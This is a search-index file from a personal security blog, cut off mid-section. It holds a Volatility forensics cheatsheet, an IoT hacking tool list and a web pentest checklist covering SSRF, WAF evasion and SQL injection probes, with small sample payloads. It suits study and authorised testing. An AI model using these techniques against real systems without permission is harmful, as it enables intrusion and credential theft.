{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":""},{"location":"#whoami","title":"$ whoami","text":"<p>Hai, welcome to my personal blog. Currently studying computer networks and very passionate in cybersecurity industry. Just nubis kubis person that always eager on new knowledge. Primarily focusing on pentesting, crypto and forensics.</p> <p> </p>"},{"location":"tags/","title":"Tags","text":"<p>Following is a list of relevant tags:</p>"},{"location":"tags/#apache-struts","title":"apache-struts","text":"<ul> <li>Oxygen</li> </ul>"},{"location":"tags/#cheatsheet","title":"cheatsheet","text":"<ul> <li>Cheatsheet</li> <li>Volatility</li> <li>Tools</li> <li>Web pentest checklist</li> </ul>"},{"location":"tags/#cve","title":"cve","text":"<ul> <li>Analytics</li> <li>Codify</li> </ul>"},{"location":"tags/#enum4linux","title":"enum4linux","text":"<ul> <li>Codify</li> <li>Basic Pentesting</li> </ul>"},{"location":"tags/#ftp","title":"ftp","text":"<ul> <li>Hidrogen</li> <li>Bounty Hacker</li> </ul>"},{"location":"tags/#gobuster","title":"gobuster","text":"<ul> <li>Analytics</li> <li>Bounty Hacker</li> </ul>"},{"location":"tags/#gtfobins","title":"gtfobins","text":"<ul> <li>Hidrogen</li> <li>Basic Pentesting</li> <li>Bounty Hacker</li> </ul>"},{"location":"tags/#hashcat","title":"hashcat","text":"<ul> <li>Codify</li> </ul>"},{"location":"tags/#hydra","title":"hydra","text":"<ul> <li>Basic Pentesting</li> <li>Bounty Hacker</li> </ul>"},{"location":"tags/#john","title":"john","text":"<ul> <li>Codify</li> <li>Basic Pentesting</li> </ul>"},{"location":"tags/#linpeas","title":"linpeas","text":"<ul> <li>Analytics</li> <li>Codify</li> <li>Butane</li> <li>Hidrogen</li> <li>Napalm</li> <li>Basic Pentesting</li> <li>Bounty Hacker</li> </ul>"},{"location":"tags/#lse","title":"lse","text":"<ul> <li>Butane</li> </ul>"},{"location":"tags/#mysql","title":"mysql","text":"<ul> <li>Hidrogen</li> </ul>"},{"location":"tags/#nfs","title":"nfs","text":"<ul> <li>Napalm</li> </ul>"},{"location":"tags/#pnwkit","title":"pnwkit","text":"<ul> <li>Butane</li> </ul>"},{"location":"tags/#pspy64","title":"pspy64","text":"<ul> <li>Codify</li> </ul>"},{"location":"tags/#pwnkit","title":"pwnkit","text":"<ul> <li>Napalm</li> </ul>"},{"location":"tags/#rce","title":"rce","text":"<ul> <li>Hidrogen</li> </ul>"},{"location":"tags/#snmpwalk","title":"snmpwalk","text":"<ul> <li>Butane</li> </ul>"},{"location":"tags/#ssh-key","title":"ssh-key","text":"<ul> <li>Napalm</li> <li>Basic Pentesting</li> </ul>"},{"location":"tags/#udp","title":"udp","text":"<ul> <li>Butane</li> </ul>"},{"location":"tags/#wpscan","title":"wpscan","text":"<ul> <li>Hidrogen</li> </ul>"},{"location":"notes/cryptography/cheatsheet/","title":"Cheatsheet","text":"<p>https://www.insecure.in/cryptography-cheat-sheet</p>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/","title":"Volatility","text":"","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#listing-processes","title":"Listing Processes","text":"<pre><code>windows.pslist.PsList\n    Lists the processes present in a particular windows memory image.\n\nwindows.psscan.PsScan\n    Scans for processes present in a particular windows memory image.\n\nwindows.pstree.PsTree\n    Plugin for listing processes in a tree based on their parent process ID.\n\ni.e:\npython vol.py -f memdump.raw windows.pslist # Get process list (EPROCESS)\npython vol.py -f memdump.raw windows.psscan # Get hidden process list(malware)\npython vol.py -f memdump.raw windows.pstree # Get processes tree (not hidden)\npython vol.py -f memdump.raw windows.pslist --pid &lt;pid&gt; --dump # Get only the .exe and no handles/dlls\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#checking-cmd-commands","title":"Checking CMD commands","text":"<pre><code>windows.cmdline.CmdLine \n        Lists process command line arguments.\ni.e:\npython vol.py -f memdump.raw windows.cmdline\n</code></pre> <p>Commands entered into cmd.exe are processed by conhost.exe (csrss.exe prior to Windows 7). So even if an attacker managed to kill the cmd.exe prior to us obtaining a memory dump, there is still a good chance of recovering history of the command line session from conhost.exe\u2019s memory. If you find something weird (using the console's modules), try to dump the memory of the conhost.exe associated process and search for strings inside it to extract the command lines.</p> <p>- Hacktricks</p>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#network-information","title":"Network Information","text":"<pre><code>windows.netscan.NetScan\n    Scans for network objects present in a particular windows memory image.\n\nwindows.netstat.NetStat\n    Traverses network tracking structures present in a particular windows memory image.\n\ni.e:\npython vol.py -f memdump.raw windows.netscan\npython vol.py -f memdump.raw windows.netstat\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#checking-dll-used","title":"Checking DLL Used","text":"<pre><code>windows.dlllist.DllList\n    Lists the loaded modules in a particular windows memory image.\n\ni.e \npython vol.py -f memdump.raw windows.dlllist [--pid &lt;pid&gt;]\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#getting-hashespasswords","title":"Getting Hashes/Passwords","text":"<pre><code>windows.cachedump.Cachedump\n    Dumps lsa secrets from memory\n\nwindows.hashdump.Hashdump\n    Dumps user hashes from memory\n\nwindows.lsadump.Lsadump\n    Dumps lsa secrets from memory\n\ni.e\npython vol.py -f memdump.raw windows.cachedump \npython vol.py -f memdump.raw windows.hashdump\npython vol.py -f memdump.raw windows.lsadump\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#getting-sids","title":"Getting SIDs","text":"<pre><code>windows.getservicesids.GetServiceSIDs\n    Lists process token sids.\n\nwindows.getsids.GetSIDs\n    Print the SIDs owning each process\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#registry","title":"Registry","text":"<pre><code>windows.registry.hivelist.HiveList\n    Lists the registry hives present in a particular memory image.\n\nwindows.registry.hivescan.HiveScan\n    Scans for registry hives present in a particular windows memory image.\n\nwindows.registry.printkey.PrintKey\n    Lists the registry keys under a hive or specific key value.\n\n\ni.e\npython vol.py -f file.dmp windows.registry.printkey.PrintKey --key \"Software\\Microsoft\\Windows NT\\CurrentVersion\" #Hacktricks\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#certificates-in-registry","title":"Certificates in Registry","text":"<pre><code>windows.registry.certificates.Certificates\n    Lists the certificates in the registry's Certificate Store.\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#user-assist","title":"User Assist","text":"<p>Enter Explanation Here <pre><code>windows.registry.userassist.UserAssist\n    Print userassist registry keys and information.\n</code></pre></p>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#malware-hunting","title":"Malware Hunting","text":"<pre><code>windows.driverirp.DriverIrp\n    List IRPs for drivers in a particular windows memory image.\n    #Checks for hooks done by malware\n\nwindows.malfind.Malfind\n    Lists process memory ranges that potentially contain injected code.\n    #Usually shows process injection/DLL injection.\n\nwindows.ldrmodules.LdrModules\n    Displays loaded modules/DLL in the memory.\n    #Can be used to detect DLL injection, especially when all 3 are false.\n\nwindows.drivermodule.DriverModule\n    Determines if any loaded drivers were hidden by a rootkit\n\nwindows.ssdt.SSDT   \n    Lists the system call table.\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#environmental-variables","title":"Environmental Variables","text":"<pre><code>windows.envars.Envars\n    Display process environment variables\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#file-related-commands","title":"File Related Commands","text":"<pre><code>windows.dumpfiles.DumpFiles\n    Dumps cached file contents from Windows memory samples.\n\nwindows.filescan.FileScan\n    Scans for file objects present in a particular windows memory image.\n\ni.e\npython vol.py -f memdump.raw windows.dumpfiles #Dumps everything\npython vol.py -f memdump.raw windows.dumpfiles --pid &lt;PID&gt; #Dumps .exe and its handles\npython vol.py -f memdump.raw windows.dumpfiles --physaddr &lt;offset&gt;\npython vol.py -f memdump.raw windows.dumpfiles --virtaddr &lt;offset&gt;\npython vol.py -f memdump.raw windows.filescan\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#mft-mbr-records","title":"MFT &amp; MBR Records","text":"<p>Enter About MFT &amp; MBR here <pre><code>windows.mftscan.MFTScan\n    Scans for MFT FILE objects present in a particular windows memory image.\n\nwindows.mbrscan.MBRScan\n    Scans for and parses potential Master Boot Records (MBRs)\n</code></pre></p>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#device-and-drivers","title":"Device and Drivers","text":"<pre><code>windows.devicetree.DeviceTree\n    Listing tree based on drivers and attached devices in a particular windows memory image.\n\nwindows.driverscan.DriverScan\n    Scans for drivers present in a particular windows memory image.\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#handles","title":"Handles","text":"<p>Explanation about brief Handles <pre><code>windows.handles.Handles\n    Lists process open handles.\n\ni.e\npython vol.py -f memdump.raw windows.handles [--pid &lt;pid&gt;]\n</code></pre></p>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#computer-information","title":"Computer Information","text":"<pre><code>windows.crashinfo.Crashinfo\n\nwindows.info.Info\n    Show OS &amp; kernel details of the memory sample being analyzed.\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#token-privileges","title":"Token Privileges","text":"<p>Explanation about privileges <pre><code>windows.privileges.Privs\n    Lists process token privileges\n</code></pre></p>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#mutex-scans","title":"Mutex Scans","text":"<p>Explanation about Mutexes <pre><code>windows.mutantscan.MutantScan\n    Scans for mutexes present in a particular windows memory image.\n</code></pre></p>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#sessions","title":"Sessions","text":"<p>Sesssions explnaation <pre><code>windows.sessions.Sessions\n    lists Processes with Session information extracted from Environmental Variables\n</code></pre></p>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#services","title":"Services","text":"<pre><code>windows.svcscan.SvcScan\n    Scans for windows services.\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#symlinks","title":"Symlinks","text":"<pre><code>windows.symlinkscan.SymlinkScan\n    Scans for links present in a particular windows memory image.\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#yara-related","title":"Yara-Related","text":"<pre><code>windows.vadyarascan.VadYaraScan\n    Scans all the Virtual Address Descriptor memory maps using yara.\n\nyarascan.YaraScan   \n    Scans kernel memory using yara rules (string or file).\n\ni.e\npython vol.py -f memdump.py windows.vadyarascan --yara-rules \"http://\" --pid &lt;pid&gt;\npython vol.py -f memdump.py yarascan --yara-rules \"ftp://\"\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#vad-related","title":"Vad Related","text":"<pre><code>windows.vadinfo.VadInfo\n    Lists process memory ranges.\n\nwindows.vadwalk.VadWalk\n    Walk the VAD tree.\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#niche-use-case","title":"Niche Use case","text":"<pre><code>windows.skeleton_key_check.Skeleton_Key_Check\n    Looks for signs of Skeleton Key malware\n</code></pre>","tags":["cheatsheet"]},{"location":"notes/forensics/volatility/#still-unsure","title":"Still Unsure","text":"<pre><code>windows.bigpools.BigPools\n    List big page pools\n\nwindows.poolscanner.PoolScanner\n    A generic pool scanner plugin.\n\nwindows.statistics.Statistics\n\nwindows.joblinks.JobLinks\n    Print process job link information\n\nwindows.callbacks.Callbacks\n    Lists kernel callbacks and notification routines.\n\nwindows.memmap.Memmap\n    Prints the memory map\n\nwindows.modscan.ModScan\n    Scans for modules present in a particular windows memory image.\n\nwindows.modules.Modules\n    Lists the loaded kernel modules.\n\nwindows.strings.Strings\n    Reads output from the strings command and indicates which process(es) each string belongs to.\n\nwindows.verinfo.VerInfo\n    Lists version information from PE files.\n\nwindows.virtmap.VirtMap\n    Lists virtual mapped sections.\n</code></pre> <p>EVTExtract <pre><code>C:/Python27/Scripts/evtxtract.exe   Z:/evidence/1/image.dd   &gt;   Z:/work/1/evtx.xml\n</code></pre></p>","tags":["cheatsheet"]},{"location":"notes/iot%20hacking/tools/","title":"Tools","text":"","tags":["cheatsheet"]},{"location":"notes/iot%20hacking/tools/#software-tools","title":"Software Tools","text":"<ul> <li> <p>Analysis Frameworks</p> <ul> <li>EXPLIoT - Pentest framework like Metasploit but specialized for IoT.</li> <li>FACT - The Firmware Analysis and Comparison Tool - Full-featured static analysis framework including extraction of firmware, analysis utilizing different plug-ins and comparison of different firmware versions.</li> <li>Improving your firmware security analysis process with FACT - Conference talk about FACT \ud83d\udcfa.</li> <li>FwAnalyzer - Analyze security of firmware based on customized rules. Intended as additional step in DevSecOps, similar to CI.</li> <li>HAL \u2013 The Hardware Analyzer - A comprehensive reverse engineering and manipulation framework for gate-level netlists.</li> <li>HomePWN - Swiss Army Knife for Pentesting of IoT Devices.</li> <li>IoTSecFuzz - Framework for automatisation of IoT layers security analysis: hardware, software and communication.</li> <li>Killerbee - Framework for Testing &amp; Auditing ZigBee and IEEE 802.15.4 Networks.</li> <li>PRET - Printer Exploitation Toolkit.</li> <li>Routersploit - Framework dedicated to exploit embedded devices.</li> </ul> </li> <li> <p>Analysis Tools</p> <ul> <li>Binwalk - Searches a binary for \"interesting\" stuff, as well as extracts arbitrary files.</li> <li>emba - Analyze Linux-based firmware of embedded devices.</li> <li>Firmadyne - Tries to emulate and pentest a firmware.</li> <li>Firmwalker - Searches extracted firmware images for interesting files and information.</li> <li>Firmware Slap - Discovering vulnerabilities in firmware through concolic analysis and function clustering.</li> <li>Ghidra - Software Reverse Engineering suite; handles arbitrary binaries, if you provide CPU architecture and endianness of the binary.</li> <li>Radare2 - Software Reverse Engineering framework, also handles popular formats and arbitrary binaries, has an extensive command line toolset.</li> <li>Trommel - Searches extracted firmware images for interesting files and information.</li> </ul> </li> <li> <p>Extraction Tools</p> <ul> <li>FACT Extractor - Detects container format automatically and executes the corresponding extraction tool.</li> <li>Firmware Mod Kit - Extraction tools for several container formats.</li> <li>The SRecord package - Collection of tools for manipulating EPROM files (can convert lots of binary formats).</li> </ul> </li> <li> <p>Support Tools</p> <ul> <li>JTAGenum - Add JTAG capabilities to an Arduino.</li> <li>OpenOCD - Free and Open On-Chip Debugging, In-System Programming and Boundary-Scan Testing.</li> </ul> </li> <li> <p>Misc Tools</p> <ul> <li>Cotopaxi - Set of tools for security testing of Internet of Things devices using specific network IoT protocols.</li> <li>dumpflash - Low-level NAND Flash dump and parsing utility.</li> <li>flashrom - Tool for detecting, reading, writing, verifying and erasing flash chips.</li> <li>Samsung Firmware Magic - Decrypt Samsung SSD firmware updates.</li> </ul> </li> </ul>","tags":["cheatsheet"]},{"location":"notes/iot%20hacking/tools/#hardware-tools","title":"Hardware Tools","text":"<ul> <li>Bus Blaster - Detects and interacts with hardware debug ports like UART and JTAG.</li> <li>Bus Pirate - Detects and interacts with hardware debug ports like UART and JTAG.</li> <li>Shikra - Detects and interacts with hardware debug ports like UART and JTAG. Among other protocols.</li> <li>JTAGULATOR - Detects JTAG Pinouts fast.</li> <li>Saleae - Easy to use Logic Analyzer that support many protocols \ud83d\udcb6.</li> <li>Ikalogic - Alternative to Saleae logic analyzers \ud83d\udcb6.</li> <li>HydraBus - Open source multi-tool hardware similar to the BusPirate but with NFC capabilities.</li> <li>ChipWhisperer - Detects Glitch/Side-channel attacks.</li> <li>Glasgow - Tool for exploring and debugging different digital interfaces.</li> <li>J-Link - J-Link offers USB powered JTAG debug probes for multiple different CPU cores \ud83d\udcb6.</li> <li> <p>Bluetooth BLE Tools</p> <ul> <li>UberTooth One - Open source 2.4 GHz wireless development platform suitable for Bluetooth experimentation.</li> <li>Bluefruit LE Sniffer - Easy to use Bluetooth Low Energy sniffer.</li> </ul> </li> <li> <p>ZigBee Tools</p> <ul> <li>ApiMote - ZigBee security research hardware for learning about and evaluating the security of IEEE 802.15.4/ZigBee systems. Killerbee compatible.</li> <li>Atmel RZUSBstick - Discontinued product. Lucky if you have one! - Tool for development, debugging and demonstration of a wide range of low power wireless applications including IEEE 802.15.4, 6LoWPAN, and ZigBee networks. Killerbee compatible.</li> <li>Freakduino - Low Cost Battery Operated Wireless Arduino Board that can be turned into a IEEE 802.15.4 protocol sniffer.</li> </ul> </li> </ul>","tags":["cheatsheet"]},{"location":"notes/iot%20hacking/tools/#sdr-tools","title":"SDR Tools","text":"<ul> <li>RTL-SDR - Cheapest SDR for beginners. It is a computer based radio scanner for receiving live radio signals frequencies from 500 kHz up to 1.75 GHz.</li> <li>HackRF One - Software Defined Radio peripheral capable of transmission or reception of radio signals from 1 MHz to 6 GHz (half-duplex).</li> <li>YardStick One - Half-duplex sub-1 GHz wireless transceiver.</li> <li>LimeSDR - Software Defined Radio peripheral capable of transmission or reception of radio signals from 100 KHz to 3.8 GHz (full-duplex).</li> <li>BladeRF 2.0 - Software Defined Radio peripheral capable of transmission or reception of radio signals from 47 MHz to 6 GHz (full-duplex).</li> <li>USRP B Series - Software Defined Radio peripheral capable of transmission or reception of radio signals from 70 MHz to 6 GHz (full-duplex).</li> </ul>","tags":["cheatsheet"]},{"location":"notes/iot%20hacking/tools/#rfid-nfc-tools","title":"RFID NFC Tools","text":"<ul> <li>Proxmark 3 RDV4 - Powerful general purpose RFID tool. From Low Frequency (125kHz) to High Frequency (13.56MHz) tags.</li> <li>ChamaleonMini - Programmable, portable tool for NFC security analysis.</li> <li>HydraNFC - Powerful 13.56MHz RFID / NFC platform. Read / write / crack / sniff / emulate.</li> </ul>","tags":["cheatsheet"]},{"location":"notes/web%20exploitation/web%20pentest%20checklist/","title":"Web pentest checklist","text":"","tags":["cheatsheet"]},{"location":"notes/web%20exploitation/web%20pentest%20checklist/#cookie-settings","title":"Cookie Settings","text":"<ul> <li> <p>Insecure transmission: Ensure cookies are sent only over HTTPS connections, to prevent interception by attackers. Set the \"Secure\" attribute for all cookies.</p> </li> <li> <p>Missing HttpOnly attribute: Set the \"HttpOnly\" attribute to ensure cookies are inaccessible to client-side scripts, reducing the risk of cross-site scripting (XSS) attacks.</p> </li> <li> <p>Missing SameSite attribute: Set the \"SameSite\" attribute to \"Strict\" or \"Lax\" to prevent cross-site request forgery (CSRF) attacks by ensuring cookies are only sent with requests originating from the same domain.</p> </li> <li> <p>Excessive cookie lifetime: Limit the duration of cookie validity by setting the \"Expires\" or \"Max-Age\" attribute. Long-lived cookies pose a greater risk if they are compromised.</p> </li> <li> <p>Weak encryption: Use strong encryption algorithms and up-to-date cryptographic libraries to protect sensitive information stored in cookies.</p> </li> <li> <p>Insufficiently random session IDs: Ensure session IDs are generated using a strong source of randomness, to prevent session hijacking and guessing attacks.</p> </li> <li> <p>Overly permissive cookie domain and path: Limit the scope of cookies by setting the \"Domain\" and \"Path\" attributes to specific subdomains or directories, reducing the risk of unauthorized access.</p> </li> <li> <p>Storing sensitive information in cookies: Avoid storing sensitive information, such as passwords, API keys, or personally identifiable information (PII) in cookies. Instead, store them server-side and use session IDs to reference the data.</p> </li> <li> <p>Unprotected cookie values: Ensure that cookie values are hashed, encrypted, or signed to protect them from being tampered with by attackers.</p> </li> <li> <p>Inadequate monitoring and logging: Implement a proper monitoring and logging system to track cookie usage, to help detect and respond to potential security incidents.</p> </li> </ul>","tags":["cheatsheet"]},{"location":"notes/web%20exploitation/web%20pentest%20checklist/#ssrf","title":"SSRF","text":"<ul> <li> <p>Test user-controlled URLs: Identify user-controlled URL inputs and test them with external URLs to see if the server fetches or processes them.</p> </li> <li> <p>Test internal IP addresses: Attempt to access internal IP addresses (e.g., 127.0.0.1 or 10.0.0.0/8) or services through user-controlled inputs to check if the server processes them.</p> </li> <li> <p>Use URL schemas: Test various URL schemas, such as file://, ftp://, or gopher://, to bypass input validation or access internal resources.</p> </li> <li> <p>Test domain resolution: Test if your server resolves domain names to internal IP addresses by using a domain that points to an internal IP address.</p> </li> <li> <p>Test URL redirection: Test if the server follows redirects by supplying a URL that redirects to an internal or external resource.</p> </li> <li> <p>Test with different HTTP methods: Test SSRF vulnerabilities with various HTTP methods, such as GET, POST, PUT, DELETE, or HEAD.</p> </li> <li> <p>Test with malformed URLs: Test with malformed URLs that may bypass input validation, such as using @ to separate credentials or adding extra slashes.</p> </li> <li> <p>Test for open ports: Attempt to access open ports on the server or internal network by specifying the target IP and port in the URL.</p> </li> <li> <p>Test for Out-of-Band (OOB) data exfiltration: Test if the server can send data to an external domain you control, which may indicate an SSRF vulnerability.</p> </li> <li> <p>Test for cloud service metadata: If your site is hosted on a cloud provider, test if the server can access cloud service metadata endpoints, which may expose sensitive information.</p> </li> <li> <p>Test with time-based techniques: Use time-based techniques, such as delays or timeouts, to confirm SSRF vulnerabilities when the server response doesn't reveal the fetched content.</p> </li> <li> <p>Test for protocol smuggling: Test for protocol smuggling, such as using http:// within an https:// URL, to bypass input validation or access internal resources.</p> </li> <li> <p>Test for bypassing URL filtering: Attempt to bypass URL filtering using techniques like URL encoding, double encoding, or mixed case encoding.</p> </li> <li> <p>Use web application scanners: Use automated web application scanners, such as Burp Suite or OWASP ZAP, to identify potential SSRF vulnerabilities.</p> </li> <li> <p>Test with IPv6 addresses: Test for SSRF vulnerabilities using IPv6 addresses to bypass input validation or access internal resources.</p> </li> </ul>","tags":["cheatsheet"]},{"location":"notes/web%20exploitation/web%20pentest%20checklist/#waf-testing","title":"WAF Testing","text":"<ul> <li> <p>Test with OWASP Top Ten attacks: Test for the most common web application vulnerabilities, such as SQLi, XSS, CSRF, and RCE.</p> </li> <li> <p>Use WAF testing tools: Utilize tools like Wafw00f, Nmap, or WAPT to identify and test your WAF's capabilities.</p> </li> <li> <p>Test for HTTP methods: Test different HTTP methods (GET, POST, PUT, DELETE, etc.) to check if your WAF is properly filtering and blocking malicious requests.</p> </li> <li> <p>Test for HTTP protocol violations: Send requests that violate the HTTP protocol to see if your WAF can detect and block them.</p> </li> <li> <p>Test with malformed requests: Send malformed requests with invalid or unexpected characters, encoding, or headers to test if your WAF can detect and block them.</p> </li> <li> <p>Test for evasion techniques: Test various evasion techniques, such as URL encoding, double encoding, or using mixed case, to bypass input filters and WAF rules.</p> </li> <li> <p>Test for IP and user agent blocking: Test if your WAF can block specific IPs or user agents, and check for bypass techniques using proxies or fake user agents.</p> </li> <li> <p>Test for rate limiting: Test if your WAF can enforce rate limiting and block requests that exceed the allowed rate.</p> </li> <li> <p>Test for cookie security: Test if your WAF can detect and block cookie manipulation, such as injecting malicious code or altering session cookies.</p> </li> <li> <p>Test for file upload vulnerabilities: Test if your WAF can detect and block malicious file uploads, such as uploading web shells or malware.</p> </li> <li> <p>Test for known attack signatures: Test your WAF's ability to detect and block known attack signatures using tools like Burp Suite or OWASP ZAP.</p> </li> <li> <p>Test custom WAF rules: Test custom WAF rules and configurations to ensure they properly block malicious requests.</p> </li> <li> <p>Test for false positives: Ensure your WAF doesn't block legitimate traffic by testing with common requests and inputs that may trigger false positives.</p> </li> <li> <p>Test for false negatives: Ensure your WAF doesn't allow malicious traffic by testing with known attack vectors that should trigger blocking.</p> </li> <li> <p>Test for SSL/TLS vulnerabilities: Test if your WAF can detect and block SSL/TLS vulnerabilities, such as POODLE or Heartbleed.</p> </li> <li> <p>Test for XML vulnerabilities: Test if your WAF can detect and block XML-based attacks, such as XXE or XEE.</p> </li> <li> <p>Test for header injection: Test if your WAF can detect and block header injection attacks, such as CRLF injection or response splitting.</p> </li> <li> <p>Test for path traversal attacks: Test if your WAF can detect and block path traversal attacks, such as directory traversal or file inclusion.</p> </li> <li> <p>Test for application-layer DDoS attacks: Test if your WAF can detect and block application-layer DDoS attacks, such as Slowloris or RUDY.</p> </li> <li> <p>Perform continuous testing and monitoring: Regularly test your WAF's effectiveness and monitor its logs to detect and block new attack vectors and emerging threats.</p> </li> </ul>","tags":["cheatsheet"]},{"location":"notes/web%20exploitation/web%20pentest%20checklist/#header-vulnerability","title":"Header Vulnerability","text":"<ul> <li> <p>Missing Strict-Transport-Security (HSTS) header: Enables HTTPS-only communication, preventing man-in-the-middle attacks.</p> </li> <li> <p>Missing X-Content-Type-Options header: Disables MIME type sniffing, reducing the risk of attacks using MIME confusion.</p> </li> <li> <p>Missing X-Frame-Options header: Prevents clickjacking attacks by disallowing or limiting the site from being embedded within frames.</p> </li> <li> <p>Missing Content-Security-Policy (CSP) header: Defines allowed sources of content, reducing the risk of cross-site scripting (XSS) and content injection attacks.</p> </li> <li> <p>Missing X-XSS-Protection header: Activates built-in browser protection against cross-site scripting (XSS) attacks.</p> </li> <li> <p>Missing Referrer-Policy header: Controls the information sent in the Referer header, protecting user privacy and reducing the risk of information leakage.</p> </li> <li> <p>Missing Feature-Policy header: Restricts the use of certain browser features and APIs, improving security and privacy.</p> </li> <li> <p>Insecure CORS (Cross-Origin Resource Sharing) settings: Allows unauthorized domains to access resources, increasing the risk of cross-site request forgery (CSRF) and data leakage.</p> </li> <li> <p>Missing Expect-CT header: Enforces Certificate Transparency, reducing the risk of misissued SSL/TLS certificates.</p> </li> <li> <p>Missing Permissions-Policy header: Defines which browser features are allowed or denied, enhancing user privacy and security.</p> </li> <li> <p>Weak or missing Public-Key-Pins (HPKP) header: Ensures the use of specific cryptographic public keys, reducing the risk of man-in-the-middle attacks using rogue certificates.</p> </li> <li> <p>Missing X-Download-Options header: Prevents file download prompts from being displayed, reducing the risk of drive-by download attacks.</p> </li> <li> <p>Missing X-Permitted-Cross-Domain-Policies header: Restricts the loading of content from other domains, reducing the risk of data theft.</p> </li> <li> <p>Missing X-DNS-Prefetch-Control header: Controls DNS prefetching, potentially improving user privacy.</p> </li> <li> <p>Inadequate Cache-Control settings: Insecure caching settings can expose sensitive information or allow unauthorized access to content.</p> </li> <li> <p>Missing X-Content-Duration header: Helps prevent unauthorized media access by specifying the duration of media files.</p> </li> <li> <p>Missing Access-Control-Allow-Origin header: Improper configuration can result in unauthorized cross-origin resource sharing.</p> </li> <li> <p>Missing X-WebKit-CSP header: This older header is used by some legacy browsers for content security policy enforcement.</p> </li> <li> <p>Missing X-Content-Security-Policy header: Similar to X-WebKit-CSP, this older header is used by some legacy browsers for content security policy enforcement.</p> </li> <li> <p>Missing X-XContent-Type-Options header: Disables MIME sniffing on older browsers, reducing the risk of MIME confusion attacks.</p> </li> <li> <p>Insecure ETag settings: Weak ETag settings can cause caching issues, potentially exposing sensitive information.</p> </li> <li> <p>Missing or weak Content-Encoding header: Properly configuring this header helps protect against attacks that rely on manipulating content encoding.</p> </li> <li> <p>Missing or weak Content-Language header: Properly configuring this header helps protect against attacks that rely on manipulating content language.</p> </li> <li> <p>Missing or weak Last-Modified header: Properly configuring this header helps protect against attacks that rely on manipulating content modification timestamps.</p> </li> <li> <p>Insecure or missing Cookie headers: As mentioned in the previous answer, insecure cookie settings can lead to various security vulnerabilities.</p> </li> </ul>","tags":["cheatsheet"]},{"location":"notes/web%20exploitation/web%20pentest%20checklist/#sql-injection","title":"SQL Injection","text":"<ul> <li> <p>Single quote test: Inject a single quote ' into input fields and observe if it generates an error or unexpected behavior, which might indicate a potential SQLi vulnerability.</p> </li> <li> <p>Tautologies: Inject tautologies like 1=1 or a=a into input fields or URL parameters to test for boolean-based SQLi.</p> </li> <li> <p>Union-based SQLi: Use the UNION operator to combine the results of two or more SELECT statements and extract data from other tables.</p> </li> <li> <p>Error-based SQLi: Inject incorrect syntax or invalid input to trigger error messages that reveal database structure or sensitive information.</p> </li> <li> <p>Time-based SQLi: Inject time-delaying functions like SLEEP() or WAITFOR DELAY to test for time-based SQLi vulnerabilities.</p> </li> <li> <p>Out-of-band (OOB) SQLi: Test for OOB SQLi by injecting payloads that cause the database to make external requests, such as DNS lookups or HTTP requests, to exfiltrate data.</p> </li> <li> <p>Double encoding: Test with double-encoded payloads to bypass filters that only decode input once. Example: %253Cscript%253Ealert(1)%253C%252Fscript%253E.</p> </li> <li> <p>Use SQL comment characters: Inject SQL comment characters (--, /, /) to bypass input filters or terminate SQL statements.</p> </li> <li> <p>Manipulate query logic: Inject logical operators such as AND or OR to manipulate the query's logic and bypass access controls.</p> </li> <li> <p>Test with different SQL dialects: Use payloads specific to different SQL dialects (e.g., MySQL, PostgreSQL, Oracle, or MSSQL) to identify database-specific vulnerabilities.</p> </li> <li> <p>Test various HTTP methods: Test for SQLi vulnerabilities using different HTTP methods, such as POST, PUT, or PATCH, with SQLi payloads.</p> </li> <li> <p>Test with URL-encoded or base64-encoded parameters: Try URL-encoded or base64-encoded parameters to bypass input validation or access control checks.</p> </li> <li> <p>Test various content types: Test for SQLi vulnerabilities in different content types that support user input, such as JSON, XML, or URL-encoded form data.</p> </li> <li> <p>Manipulate cookies: Inject SQL payloads into cookies to test if the application processes them in an unsafe manner.</p> </li> <li> <p>Use web application scanners: Use automated web application scanners, such as Burp Suite or OWASP ZAP, to identify potential SQLi vulnerabilities.</p> </li> </ul>","tags":["cheatsheet"]},{"location":"notes/web%20exploitation/web%20pentest%20checklist/#tls-vulnerability","title":"TLS Vulnerability","text":"<ul> <li> <p>Weak or outdated SSL/TLS protocols: Ensure your site only supports secure and up-to-date protocols like TLS 1.2 and TLS 1.3, and disable insecure ones like SSL 2.0, SSL 3.0, and TLS 1.0.</p> </li> <li> <p>Insecure cipher suites: Disable weak cipher suites and use strong ones, such as those based on AES-GCM, ChaCha20-Poly1305, or ECDHE (Elliptic Curve Diffie-Hellman).</p> </li> <li> <p>Vulnerability to known attacks: Protect your site from known TLS attacks, such as POODLE, BEAST, CRIME, BREACH, or Heartbleed, by applying security patches and following best practices.</p> </li> <li> <p>Inadequate certificate management: Use a valid, trusted, and up-to-date SSL/TLS certificate from a reputable Certificate Authority (CA). Regularly check for certificate expiration and renewals.</p> </li> <li> <p>Insufficient certificate chain validation: Ensure proper validation of the certificate chain to prevent man-in-the-middle attacks using rogue or misissued certificates.</p> 